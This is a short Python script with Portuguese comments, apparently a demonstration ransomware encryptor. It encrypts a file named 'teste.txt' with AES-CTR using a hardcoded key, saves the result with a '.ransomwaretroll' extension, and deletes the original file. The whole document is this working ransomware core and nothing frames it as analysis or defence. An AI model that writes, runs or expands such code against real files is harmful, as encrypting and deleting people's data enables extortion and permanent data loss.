import os
import pyaes

# Função para criptografar o arquivo
def encrypt_file(file_name, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Inicializar o objeto AES para criptografar
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        # Gerar o nome do arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"

        # Escrever o arquivo criptografado
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        # Remover o arquivo original
        os.remove(file_name)

        print(f"Arquivo '{file_name}' criptografado com sucesso!")
        print(f"Arquivo criptografado gerado: {new_file_name}")

    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")


# Nome do arquivo original e chave para criptografia
file_name = "teste.txt"
key = b"testeransomwares"

# Chamar a função para criptografar
encrypt_file(file_name, key)
